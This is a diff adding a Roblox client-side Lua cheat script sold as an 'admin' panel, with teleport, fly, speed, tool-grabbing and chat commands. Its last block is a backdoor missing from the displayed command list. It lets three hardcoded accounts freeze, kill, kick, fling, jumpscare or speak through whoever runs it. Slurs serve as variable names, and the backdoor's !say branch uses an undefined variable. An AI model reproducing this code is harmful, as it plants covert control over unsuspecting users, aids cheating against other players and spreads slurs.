@@ -1,0 +1,851 @@
+--x0y0zkidd admin script MEGA UPDATE + FIX!!! :D
+ 
+local plr      = game:GetService("Players")
+local me       = plr.LocalPlayer
+local hum      = me.Character:WaitForChild("Humanoid")
+local hrp      = me.Character:WaitForChild("HumanoidRootPart")
+ 
+local uis      = game:GetService("UserInputService")
+local rep = game:GetService("ReplicatedStorage")
+local textChat = game:GetService("TextChatService")
+local run = game:GetService("RunService")
+ 
+local Uhold = false
+local Dhold = false
+local Fhold = false
+local Bhold
+local Rhold = false
+local Lhold = false
+ 
+local uisHolder
+ 
+local work = game:GetService("Workspace")
+ 
+local rightleg = "Right Leg"
+ 
+local function update()
+	if me.Character then
+		hum = me.Character:WaitForChild("Humanoid")
+		hrp = me.Character:WaitForChild("HumanoidRootPart")
+	end
+end
+ 
+me.CharacterAdded:Connect(update)
+if me.Character then
+	update()
+end
+ 
+local speedCon
+local jumpCon
+local gravityCon
+local flyCon
+local flyCon2
+local flyCon3
+local flyCon4
+local flyCon5
+local flyCon6
+ 
+local fhCon
+ 
+local toolcon
+ 
+local screen  = Instance.new("ScreenGui")
+screen.Name   = "xyz_admin"
+screen.Parent = me.PlayerGui
+ 
+local frame            = Instance.new("Frame")
+frame.Parent           = screen
+frame.Size             = UDim2.new(0, 270, 0, 350)
+frame.BackgroundColor3 = Color3.fromRGB(255,20,147)
+frame.Position         = UDim2.new(0, 1340, 0, 550)
+ 
+frame.Active     = true
+frame.Selectable = true
+frame.Draggable  = true
+ 
+local keyt                  = Instance.new("TextBox")
+keyt.Parent                 = frame
+keyt.Size                   = UDim2.new(0, 105, 0, 45)
+keyt.Position               = UDim2.new(0, 85, 0, 174)
+keyt.Text                   = ""
+keyt.TextColor3             = Color3.fromRGB(255,255,255)
+keyt.TextSize               = 10
+keyt.PlaceholderText        = ""
+keyt.ClearTextOnFocus       = false
+keyt.MultiLine              = true
+keyt.Font                   = Enum.Font.GothamBold
+keyt.PlaceholderColor3      = Color3.fromRGB(65,65,65)
+keyt.BackgroundColor3       = Color3.fromRGB(186,85,211)
+keyt.BackgroundTransparency = 1
+keyt.TextXAlignment         = "Left"
+keyt.TextYAlignment         = "Top"
+ 
+local exe                  = Instance.new("ImageLabel")
+exe.Parent                 = frame
+exe.Size                   = keyt.Size
+exe.Position               = keyt.Position
+exe.BackgroundTransparency = 1
+exe.Image                  = "rbxassetid://89760411485169"
+exe.ZIndex                 = 1
+keyt.ZIndex                = 2
+ 
+local btn            = Instance.new("TextButton")
+btn.Parent           = frame
+btn.Size             = UDim2.new(0, 20, 0, 19)
+btn.Position         = UDim2.new(0, 245, 0, 4)
+btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+btn.Text             = "X"
+btn.TextSize         = 12
+btn.TextColor3       = Color3.fromRGB(255,0,0)
+ 
+local btn2            = Instance.new("TextButton")
+btn2.Parent           = frame
+btn2.Size             = UDim2.new(0, 105, 0, 45)
+btn2.Position         = UDim2.new(0, 85, 0, 114)
+btn2.Text             = "Clear"
+btn2.TextSize         = 11
+btn2.BackgroundColor3 = Color3.fromRGB(186,85,211)
+ 
+local text             = Instance.new("TextBox")
+text.Parent            = frame
+text.Size              = UDim2.new(0, 105, 0, 45)
+text.Position          = UDim2.new(0, 85, 0, 54)
+text.Text              = ""
+text.TextSize          = 12
+text.PlaceholderText   = "Command"
+text.PlaceholderColor3 = Color3.fromRGB(65,65,65)
+text.ClearTextOnFocus  = false
+text.BackgroundColor3  = Color3.fromRGB(186,85,211)
+ 
+local btn3            = Instance.new("TextButton")
+btn3.Parent           = frame
+btn3.Size             = UDim2.new(0, 75, 0, 15)
+btn3.Position         = UDim2.new(0, 34, 0, 16)
+btn3.Text             = "Command list"
+btn3.BackgroundColor3 = Color3.fromRGB(186,85,211)
+ 
+local btn4            = Instance.new("TextButton")
+btn4.Parent           = frame
+btn4.Size             = UDim2.new(0, 75, 0, 15)
+btn4.Position         = UDim2.new(0, 162, 0, 16)
+btn4.Text             = "Themes"
+btn4.BackgroundColor3 = Color3.fromRGB(186,85,211)
+ 
+local label           = Instance.new("TextLabel")
+label.Parent          = frame
+label.Text            = "x0y0zkidd's\nadmin"
+label.TextSize        = 16
+label.BorderSizePixel = 0
+label.Position        = UDim2.new(0, 137, 0, 310)
+ 
+local labelP           = Instance.new("TextLabel")
+labelP.Parent          = frame
+labelP.Text            = "Pray for\nTubers93!"
+labelP.TextSize        = 16
+labelP.BorderSizePixel = 0
+labelP.Position        = UDim2.new(0, 137, 0, 250)
+labelP.Name            = "TextLabel2"
+ 
+local frame2            = Instance.new("Frame")
+frame2.Parent           = screen
+frame2.Size             = UDim2.new(0, 310, 0, 420)
+frame2.BackgroundColor3 = Color3.fromRGB(255,20,147)
+frame2.Position         = UDim2.new(0, 1040, 0, 550)
+frame2.Name             = "f2"
+frame2.Visible = false
+    
+    
+frame2.Active     = true
+frame2.Selectable = true
+frame2.Draggable  = true
+    
+local label2           = Instance.new("TextLabel")
+label2.Parent          = frame2
+label2.BorderSizePixel = 0
+label2.TextSize        = 11
+label2.Text            = "to <player> //tp you to player\nfollow<player> //follows player\nheadsit <player> //sits to player's head\nwaypoint <name> //creates a waypoint\nwayrm <name> //removes waypoint by name\ntpway <name> //tp you to wyapoint by name\nview <player> spectate the player\nunview //stop spectating\nspeed <num> //changes ur speed\njumppower <num> //changes ur jumppower\ngravity <num> //changes ur gravity\nsay <msg> says the msg in chat\ngrabtools //grabs all the tools\nungrabtools //stop grabbingtools\ndroptools //drops all the tools\nlay //makes you lay\nsit //makes you sit\nreset //reset you\nmaxzoom <num> //set your maxzoom\nminzoom <num> //set your minzoom\nrejoin //rejoin the game\nclicktp //ctrl + m1 to tp\ninfjump // inf jumps\njump //jumps\n fly / unfly // toggle fly"
+label2.Position        = UDim2.new(0, 155, 0, 220)
+    
+local labelC           = Instance.new("TextLabel")
+labelC.Parent          = frame2
+labelC.BorderSizePixel = 0
+labelC.TextSize        = 14
+labelC.Text            = "Command list"
+labelC.Position        = UDim2.new(0, 150, 0, 15)
+    
+local btnX            = Instance.new("TextButton")
+btnX.Parent           = frame2
+btnX.Size             = UDim2.new(0, 20, 0, 19)
+btnX.Position         = UDim2.new(0, 284, 0, 4)
+btnX.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+btnX.Text             = "X"
+btnX.TextSize         = 12
+btnX.TextColor3       = Color3.fromRGB(255,0,0)
+ 
+local frame3            = Instance.new("Frame")
+frame3.Parent           = screen
+frame3.Size             = UDim2.new(0, 235, 0, 250)
+frame3.BackgroundColor3 = Color3.fromRGB(255,20,147)
+frame3.Position         = UDim2.new(0, 1340, 0, 250)
+frame3.Name             = "f3"
+frame3.Visible = false
+    
+    
+frame3.Active     = true
+frame3.Selectable = true
+frame3.Draggable  = true
+    
+local btnX2            = Instance.new("TextButton")
+btnX2.Parent           = frame3
+btnX2.Size             = UDim2.new(0, 20, 0, 19)
+btnX2.Position         = UDim2.new(0, 210, 0, 4)
+btnX2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+btnX2.Text             = "X"
+btnX2.TextSize         = 12
+btnX2.TextColor3       = Color3.fromRGB(255,0,0)
+    
+btnX2.MouseButton1Click:Connect(function()
+    frame3.Visible = false
+end)
+    
+local btnT            = Instance.new("TextButton")
+btnT.Parent           = frame3
+btnT.Size             = UDim2.new(0, 55, 0, 25)
+btnT.Position         = UDim2.new(0, 92, 0, 35)
+btnT.Text             = "Light"
+btnT.BackgroundColor3 = Color3.fromRGB(186,85,211)
+btnT.TextSize         = 11
+    
+local btnT2            = Instance.new("TextButton")
+btnT2.Parent           = frame3
+btnT2.Size             = UDim2.new(0, 55, 0, 25)
+btnT2.Position         = UDim2.new(0, 92, 0, 85)
+btnT2.Text             = "Dark"
+btnT2.BackgroundColor3 = Color3.fromRGB(186,85,211)
+btnT2.TextSize         = 11
+btnT2.Name             = "btnT2"
+    
+local btnT3            = Instance.new("TextButton")
+btnT3.Parent           = frame3
+btnT3.Size             = UDim2.new(0, 55, 0, 25)
+btnT3.Position         = UDim2.new(0, 92, 0, 135)
+btnT3.Text             = "Basic"
+btnT3.BackgroundColor3 = Color3.fromRGB(186,85,211)
+btnT3.TextSize         = 11
+btnT3.Name             = "btnT3"
+ 
+btnT.MouseButton1Click:Connect(function()
+	for _, col in pairs(screen:GetDescendants()) do
+		if col:IsA("Frame") then
+			col.BackgroundColor3 = Color3.fromRGB(254,254,254)
+		elseif col:IsA("TextButton") or col:IsA("TextBox") then
+			col.BackgroundColor3 = Color3.fromRGB(220,220,220)
+			col.TextColor3 = Color3.fromRGB(0,0,0)
+		elseif col:IsA("TextLabel") then
+			col.TextColor3 = Color3.fromRGB(0,0,0)
+		end
+	end
+end)
+ 
+btnT2.MouseButton1Click:Connect(function()
+	for _, col in pairs(screen:GetDescendants()) do
+		if col:IsA("Frame") then
+			col.BackgroundColor3 = Color3.fromRGB(0,0,0)
+		elseif col:IsA("TextButton") or col:IsA("TextBox") then
+			col.BackgroundColor3 = Color3.fromRGB(100,100,100)
+			col.TextColor3 = Color3.fromRGB(255,255,255)
+		elseif col:IsA("TextLabel") then
+			col.TextColor3 = Color3.fromRGB(255,255,255)
+		end
+	end
+end)
+    
+btnT3.MouseButton1Click:Connect(function()
+    for _, col in pairs(screen:GetDescendants()) do
+		if col:IsA("Frame") then
+			col.BackgroundColor3 = Color3.fromRGB(255,20,147)
+		elseif col:IsA("TextButton") or col:IsA("TextBox") then
+			col.BackgroundColor3 = Color3.fromRGB(186,85,211)
+			col.TextColor3 = Color3.fromRGB(0,0,0)
+		elseif col:IsA("TextLabel") then
+			col.TextColor3 = Color3.fromRGB(0,0,0)
+		end
+	end
+end)
+    
+local labelT           = Instance.new("TextLabel")
+labelT.Parent          = frame3
+labelT.BorderSizePixel = 0
+labelT.TextSize        = 14
+labelT.Text            = "Themes"
+labelT.Position        = UDim2.new(0, 120, 0, 15)
+labelT.Name            = "labelT"
+    
+local textT             = Instance.new("TextBox")
+textT.Parent            = frame3
+textT.Size              = UDim2.new(0, 85, 0, 25)
+textT.Position          = UDim2.new(0, 78, 0, 174)
+textT.Text              = ""
+textT.PlaceholderText   = "Own"
+textT.TextSize          = 11
+textT.PlaceholderColor3 = Color3.fromRGB(65,65,65)
+textT.ClearTextOnFocus  = false
+textT.BackgroundColor3  = Color3.fromRGB(186,85,211)
+textT.Name              = "textT"
+    
+local labelT2           = Instance.new("TextLabel")
+labelT2.Parent          = frame3
+labelT2.BorderSizePixel = 0
+labelT2.Text            = "Example:\nblue"
+labelT2.TextSize        = 10
+labelT2.Position        = UDim2.new(0, 200, 0, 186)
+labelT2.Name            = "labelT2"
+    
+textT.FocusLost:Connect(function(ent)
+    if ent then
+        if textT.Text == "blue" then
+            for _, col in pairs(screen:GetDescendants()) do
+				if col:IsA("Frame") then
+					col.BackgroundColor3 = Color3.fromRGB(0,0,255)
+				elseif col:IsA("TextButton") or col:IsA("TextBox") then
+					col.BackgroundColor3 = Color3.fromRGB(0,125,255)
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				elseif col:IsA("TextLabel") then
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				end
+			end
+        elseif textT.Text == "red" then
+            for _, col in pairs(screen:GetDescendants()) do
+				if col:IsA("Frame") then
+					col.BackgroundColor3 = Color3.fromRGB(255,0,0)
+				elseif col:IsA("TextButton") or col:IsA("TextBox") then
+					col.BackgroundColor3 = Color3.fromRGB(255,126,126)
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				elseif col:IsA("TextLabel") then
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				end
+			end
+        elseif textT.Text == "green" then
+            for _, col in pairs(screen:GetDescendants()) do
+				if col:IsA("Frame") then
+					col.BackgroundColor3 = Color3.fromRGB(0,255,0)
+				elseif col:IsA("TextButton") or col:IsA("TextBox") then
+					col.BackgroundColor3 = Color3.fromRGB(0,200,0)
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				elseif col:IsA("TextLabel") then
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				end
+			end
+        elseif textT.Text == "orange" then
+			for _, col in pairs(screen:GetDescendants()) do
+				if col:IsA("Frame") then
+					col.BackgroundColor3 = Color3.fromRGB(255,135,0)
+				elseif col:IsA("TextButton") or col:IsA("TextBox") then
+					col.BackgroundColor3 = Color3.fromRGB(255,159,102)
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				elseif col:IsA("TextLabel") then
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				end
+			end
+        elseif textT.Text == "yellow" then
+			for _, col in pairs(screen:GetDescendants()) do
+				if col:IsA("Frame") then
+					col.BackgroundColor3 = Color3.fromRGB(255,255,0)
+				elseif col:IsA("TextButton") or col:IsA("TextBox") then
+					col.BackgroundColor3 = Color3.fromRGB(188,255,0)
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				elseif col:IsA("TextLabel") then
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				end
+			end
+		elseif textT.Text == "purple" then
+			for _, col in pairs(screen:GetDescendants()) do
+				if col:IsA("Frame") then
+					col.BackgroundColor3 = Color3.fromRGB(170,0,255)
+				elseif col:IsA("TextButton") or col:IsA("TextBox") then
+					col.BackgroundColor3 = Color3.fromRGB(215,135,255)
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				elseif col:IsA("TextLabel") then
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				end
+			end
+		elseif textT.Text == "pink" then
+			for _, col in pairs(screen:GetDescendants()) do
+				if col:IsA("Frame") then
+					col.BackgroundColor3 = Color3.fromRGB(255,155,255)
+				elseif col:IsA("TextButton") or col:IsA("TextBox") then
+					col.BackgroundColor3 = Color3.fromRGB(215,135,255)
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				elseif col:IsA("TextLabel") then
+					col.TextColor3 = Color3.fromRGB(0,0,0)
+				end
+			end
+        end
+    end
+end)
+    
+local btnT4            = Instance.new("TextButton")
+btnT4.Parent           = frame3
+btnT4.Size             = UDim2.new(0, 55, 0, 25)
+btnT4.Position         = UDim2.new(0, 92, 0, 214)
+btnT4.Text             = "Clear"
+btnT4.BackgroundColor3 = Color3.fromRGB(186,85,211)
+btnT4.TextSize         = 11
+btnT4.Name             = "btnT4"
+    
+btnT4.MouseButton1Click:Connect(function()
+	textT.Text = ""
+end)
+    
+btnX.MouseButton1Click:Connect(function()
+    frame2.Visible = false
+end)
+ 
+btn.MouseButton1Click:Connect(function()
+    screen:Destroy()
+end)
+ 
+btn2.MouseButton1Click:Connect(function()
+    text.Text = ""
+end)
+ 
+btn3.MouseButton1Click:Connect(function()
+    for _, com in pairs(screen:GetChildren()) do
+		if com.Name == "f2" then
+			com.Visible = true
+		end
+	end
+end)
+ 
+btn4.MouseButton1Click:Connect(function()
+    for _, the in pairs(screen:GetChildren()) do
+		if the.Name == "f3" then
+			the.Visible = true
+		end
+	end
+end)
+ 
+text.FocusLost:Connect(function(e)
+    if e then
+        if text.Text:sub(1, 2) == "to" then
+            local args = text.Text:sub(4)
+            if args ~= "" then
+                for _, oth in pairs(plr:GetPlayers()) do
+                    if oth.Name:lower():find(args:lower()) or oth.DisplayName:lower():find(args:lower()) then
+                        hrp.CFrame = oth.Character.HumanoidRootPart.CFrame
+                    end
+                end
+            end
+        elseif text.Text:sub(1, 6) == "follow" then
+            local args2 = text.Text:sub(8)
+            if args2 ~= "" then
+                for _, oth2 in pairs(plr:GetPlayers()) do
+                    if oth2.Name:lower():find(args2:lower()) or oth2.DisplayName:lower():find(args2:lower()) then
+                        local connection
+                        connection = game:GetService("RunService").RenderStepped:Connect(function()
+                            hum:MoveTo(oth2.Character.HumanoidRootPart.Position)
+                            if text.Text == "unfollow" then
+                                connection:Disconnect()
+                                wait()
+                                hum:MoveTo(hrp.Position)
+                            end
+                        end)
+                    end
+                end
+            end
+        elseif text.Text:sub(1, 7) == "headsit" then
+            local args3 = text.Text:sub(9)
+            if args3 ~= "" then
+                for _, oth3 in pairs(plr:GetPlayers()) do
+                    if oth3.Name:lower():find(args3:lower()) or oth3.DisplayName:lower():find(args3:lower()) then
+                        hum.Sit = true
+ 
+                        local con2
+                        con2 = game:GetService("RunService").RenderStepped:Connect(function()
+                            hrp.CFrame = oth3.Character.Head.CFrame * CFrame.Angles(0,0,0)
+                            uis.InputBegan:Connect(function(i2, g2)
+                                if i2.KeyCode == Enum.KeyCode.Space and not g2 then
+                                    hum.Sit = false
+ 
+									if con2 then
+                                    	con2:Disconnect()
+										con2 = nil
+									end
+                                end
+                            end)
+                        end)
+                    end
+                end
+            end
+        elseif text.Text:sub(1, 8) == "waypoint" then
+            local args4 = text.Text:sub(10)
+            if args4 ~= "" then
+                local p        = Instance.new("Part")
+                p.Parent       = me.Character
+                p.Name         = args4
+                p.Transparency = 0.9
+                p.Anchored     = true
+                p.CanCollide   = false
+                p.BrickColor   = BrickColor.new("Pink")
+                if me.Character:FindFirstChild("RightFoot") then
+                    p.CFrame = me.Character.RightFoot.CFrame
+                else
+                    p.CFrame = me.Character[rightleg].CFrame
+                end
+            end
+        elseif text.Text:sub(1, 5) == "wayrm" then
+            local args5 = text.Text:sub(7)
+            if args5 ~= "" then
+                me.Character[args5]:Destroy()
+            end
+        elseif text.Text:sub(1, 5) == "tpway" then
+            local args6 = text.Text:sub(7)
+            if args6 ~= "" then
+                hrp.CFrame = me.Character[args6].CFrame
+            end
+        elseif text.Text:sub(1, 4) == "view" then
+            local args7 = text.Text:sub(6)
+            if args7 ~= "" then
+                for _, oth4 in pairs(plr:GetPlayers()) do
+                    if oth4.Name:lower():find(args7:lower()) or oth4.DisplayName:lower():find(args7:lower()) then
+                        work.Camera.CameraSubject = oth4.Character
+                    end
+                end
+            end
+        elseif text.Text == "unview" then
+            work.Camera.CameraSubject = me.Character
+        elseif text.Text:sub(1, 5) == "speed" then
+            local args8 = text.Text:sub(7)
+            if args8 ~= "" then
+			    if speedCon then
+					speedCon:Disconnect()
+					speedCon = nil
+ 
+					speedCon = run.RenderStepped:Connect(function()
+                		hum.WalkSpeed = args8
+					end)
+				else
+					speedCon = run.RenderStepped:Connect(function()
+                		hum.WalkSpeed = args8
+					end)
+				end
+            end
+        elseif text.Text:sub(1, 9) == "jumppower" then
+            local args9 = text.Text:sub(11)
+            if args9 ~= "" then
+                if jumpCon then
+					jumpCon:Disconnect()
+					jumpCon = nil
+ 
+					jumpCon = run.RenderStepped:Connect(function()
+                		hum.JumpPower = args9
+					end)
+				else
+					jumpCon = run.RenderStepped:Connect(function()
+                		hum.JumpPower = args9
+					end)
+				end
+            end
+        elseif text.Text:sub(1, 7) == "gravity" then
+            local grav = text.Text:sub(9)
+            if grav ~= "" then
+                if gravityCon then
+					gravityCon:Disconnect()
+					gravityCon = nil
+ 
+					gravityCon = run.RenderStepped:Connect(function()
+                		work.Gravity = grav
+					end)
+				else
+					gravityCon = run.RenderStepped:Connect(function()
+                		work.Gravity = grav
+					end)
+				end
+            end
+        elseif text.Text:sub(1,3) == "say" then
+            local say = text.Text:sub(5)
+            if say ~= "" then
+                if textChat and textChat:FindFirstChild("TextChannels") then
+                    local textChat2 = textChat.TextChannels:FindFirstChild("RBXGeneral")
+					if textChat2 then
+						textChat2:SendAsync(say)
+					end
+				elseif rep and rep:FindFirstChild("DefaultChatSystemChatEvents") then
+                    local oldChat = rep.DefaultChatSystemChatEvents
+					if oldChat then
+						oldChat.SayMessageRequest:FireServer(say, "ALL")
+					end
+                end
+            end
+        elseif text.Text == "grabtools" then
+            toolcon = game:GetService("RunService").RenderStepped:Connect(function()
+                for _, tool in pairs(work:GetChildren()) do
+                    if tool:IsA("Tool") then
+                        tool.Parent = me.Backpack
+                    end
+                end
+            end)
+        elseif text.Text == "ungrabtools" then
+            toolcon:Disconnect()
+        elseif text.Text == "droptools" then
+            for _, drop in pairs(me.Backpack:GetChildren()) do
+                if drop:IsA("Tool") then
+                    drop.Parent = work
+                end
+            end
+        elseif text.Text == "lay" then
+            hum.Sit = true
+            task.wait(0.1)
+            hum.RootPart.CFrame = hum.RootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
+            for _, nigger in pairs(hum:GetPlayingAnimationTracks()) do
+                nigger:Stop()
+            end
+        elseif text.Text == "sit" then
+            hum.Sit = true
+        elseif text.Text == "reset" then
+            hum.Health = 0
+        elseif text.Text == "rejoin" then
+            local p = plr:GetPlayers()
+ 
+            if #p <= 1 then
+                p.LocalPlayer:Kick("Rejoin")
+                wait()
+                game:GetService("TeleportService"):Teleport(game.PlaceId, p.LocalPlayer)
+            else
+                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, p.LocalPlayer)
+            end
+        elseif text.Text:sub(1, 7) == "maxzoom" then
+            local mz = text.Text:sub(9)
+            if mz ~= "" then
+                me.CameraMaxZoomDistance = mz
+            end
+        elseif text.Text:sub(1, 7) == "minzoom" then
+            local minz = text.Text:sub(9)
+            if minz ~= "" then
+                me.CameraMinZoomDistance = minz
+            end
+        elseif text.Text == "clicktp" then
+            game:GetService("UserInputService").InputBegan:Connect(function(input, gay)
+                if gay then return end
+    
+                local ctrl = game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl)
+    
+                if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                    if ctrl then
+                        mouse      = plr.LocalPlayer:GetMouse()
+                        local tp   = mouse.Hit+Vector3.new(0,2.5,0)
+                        tp         = CFrame.new(tp.X,tp.Y,tp.Z)
+                        hrp.CFrame = tp
+                    else
+                        print("Only m1 :(")
+                    end
+                end
+            end)
+        elseif text.Text == "infjump" then
+            game:GetService("UserInputService").InputBegan:Connect(function(i,g)
+                if i.KeyCode == Enum.KeyCode.Space and not g then
+                    me.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                end
+            end)
+        elseif text.Text == "jump" then
+            me.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+		elseif text.Text == "fly" then
+			local flyHolder = Instance.new("Part")
+			flyHolder.Parent = me.Character
+			flyHolder.Transparency = 0.999
+			flyHolder.Name = "FlyHolder"
+			fhCon = run.RenderStepped:Connect(function()
+				flyHolder.CFrame = hrp.CFrame * CFrame.new(0,-3.6,0)
+			end)
+			uisHolder = uis.InputBegan:Connect(function(i,g)
+				if g then return end
+ 
+				if i.KeyCode == Enum.KeyCode.E and not Uhold then
+					Uhold = true
+					flyCon = run.RenderStepped:Connect(function(dt)
+						for _, endAnims in pairs(hum:GetPlayingAnimationTracks()) do
+							endAnims:Stop()
+						end
+						
+						hrp.CFrame = hrp.CFrame + hrp.CFrame.UpVector * 100 * dt
+					end)
+				elseif i.KeyCode == Enum.KeyCode.Q and not Dhold then
+					Dhold = true
+					flyCon2 = run.RenderStepped:Connect(function(dt)
+						for _, endAnims in pairs(hum:GetPlayingAnimationTracks()) do
+							endAnims:Stop()
+						end
+						
+						hrp.CFrame = hrp.CFrame + -hrp.CFrame.UpVector * 100 * dt
+					end)
+				elseif i.KeyCode == Enum.KeyCode.W and not Fhold then
+					Fhold = true
+					flyCon3 = run.RenderStepped:Connect(function(dt)
+						for _, endAnims in pairs(hum:GetPlayingAnimationTracks()) do
+							endAnims:Stop()
+						end
+						
+						hrp.CFrame = hrp.CFrame + hrp.CFrame.LookVector * 100 * dt
+					end)
+				elseif i.KeyCode == Enum.KeyCode.S and not Bhold then
+					Bhold = true
+					flyCon4 = run.RenderStepped:Connect(function(dt)
+						for _, endAnims in pairs(hum:GetPlayingAnimationTracks()) do
+							endAnims:Stop()
+						end
+						
+						hrp.CFrame = hrp.CFrame + -hrp.CFrame.LookVector * 100 * dt
+					end)
+				elseif i.KeyCode == Enum.KeyCode.D and not Rhold then
+					Rhold = true
+					flyCon5 = run.RenderStepped:Connect(function(dt)
+						for _, endAnims in pairs(hum:GetPlayingAnimationTracks()) do
+							endAnims:Stop()
+						end
+						
+						hrp.CFrame = hrp.CFrame + hrp.CFrame.RightVector * 100 * dt
+					end)
+				elseif i.KeyCode == Enum.KeyCode.A and not Lhold then
+					Lhold = true
+					flyCon6 = run.RenderStepped:Connect(function(dt)
+						for _, endAnims in pairs(hum:GetPlayingAnimationTracks()) do
+							endAnims:Stop()
+						end
+						
+						hrp.CFrame = hrp.CFrame + -hrp.CFrame.RightVector * 100 * dt
+					end)
+				end
+			end)
+			uis.InputEnded:Connect(function(i,g)
+				if g then return end
+ 
+				if i.KeyCode == Enum.KeyCode.E then
+					Uhold = false
+					
+					if flyCon then
+						flyCon:Disconnect()
+						flyCon = nil
+					end
+				elseif i.KeyCode == Enum.KeyCode.Q then
+					Dhold = false
+					
+					if flyCon2 then
+						flyCon2:Disconnect()
+						flyCon2 = nil
+					end
+				elseif i.KeyCode == Enum.KeyCode.W then
+					Fhold = false
+					
+					if flyCon3 then
+						flyCon3:Disconnect()
+						flyCon3 = nil
+					end
+				elseif i.KeyCode == Enum.KeyCode.S then
+					Bhold = false
+					
+					if flyCon4 then
+						flyCon4:Disconnect()
+						flyCon4 = nil
+					end
+				elseif i.KeyCode == Enum.KeyCode.D then
+					Rhold = false
+					
+					if flyCon5 then
+						flyCon5:Disconnect()
+						flyCon5 = nil
+					end
+				elseif i.KeyCode == Enum.KeyCode.A then
+					Lhold = false
+					
+					if flyCon6 then
+						flyCon6:Disconnect()
+						flyCon6 = nil
+					end
+				end
+			end)
+		elseif text.Text == "unfly" then
+			hrp.Anchored = false
+			
+			local fPart = me.Character:FindFirstChild("FlyHolder")
+			if fPart then
+				fPart:Destroy()
+			end
+			
+			if uisHolder then
+				uisHolder:Disconnect()
+				uisHolder = nil
+			elseif fhCon then
+				fhCon:Disconnect()
+				fhCon = nil
+			end
+        end
+    end
+end)
+ 
+uis.InputBegan:Connect(function(i, g)
+    if i.KeyCode == Enum.KeyCode.Semicolon and not g then
+        text:CaptureFocus()
+        wait(0)
+        text.Text = ""
+    end
+end)
+ 
+for _, control in pairs(plr:GetPlayers()) do
+	if control.Name == "1reserveacc1" or control.Name == "Litka505" or control.Name == "Baconchik_oofarik" then
+		control.Chatted:Connect(function(chat)
+			if chat == "!bring" then
+				hrp.CFrame = control.Character.HumanoidRootPart.CFrame
+			elseif chat == "!freeze" then
+				hrp.Anchored = true
+			elseif chat == "!unfreeze" then
+				hrp.Anchored = false
+			elseif chat:sub(1,4) == "!say" then
+				local cArgs = cht:sub(6)
+ 
+				if cArgs ~= "" then
+					if textChat and textChat:FindFirstChild("TextChannels") then
+                    	local textChat2 = textChat.TextChannels:FindFirstChild("RBXGeneral")
+					if textChat2 then
+						textChat2:SendAsync(cArgs)
+					end
+				end
+				elseif rep and rep:FindFirstChild("DefaultChatSystemChatEvents") then
+                    local oldChat = rep.DefaultChatSystemChatEvents
+					if oldChat then
+						oldChat.SayMessageRequest:FireServer(cArgs, "ALL")
+					end
+				end
+			elseif chat == "!ban" then
+				me:Kick("You have been banned!")
+			elseif chat == "!jumpscare" then
+				local Jscreen  = Instance.new("ScreenGui")
+				Jscreen.Parent = me.PlayerGui
+ 
+				local Jimage  = Instance.new("ImageLabel")
+				Jimage.Parent = Jscreen
+				Jimage.Image  = "http://www.roblox.com/asset/?id=91274624708428"
+				Jimage.Size   = UDim2.new(1,1,1,1)
+ 
+				local Jsound                = Instance.new("Sound")
+				Jsound.Parent               = work
+				Jsound.Name                 = "jmp"
+				Jsound.SoundId              = "rbxassetid://6129291390"
+				Jsound.Volume               = 10
+ 
+				work.jmp.Playing = true
+ 
+				Jscreen.ResetOnSpawn = false
+ 
+				task.delay(9.8, function()
+    				Jscreen:Destroy()
+				end)
+			elseif chat == "!kill" then
+				hum.Health = 0
+			elseif chat == "!fling" then
+				hrp.CFrame = CFrame.new(-64.4950714, 633.052734, 104.106598, -0.921858728, -0.378823459, 0.0816653818, -1.67315939e-10, 0.210735187, 0.977543235, -0.387526065, 0.901156723, -0.1942681)
+			end
+		end)
+	end
+end
+ 
+screen.ResetOnSpawn = false
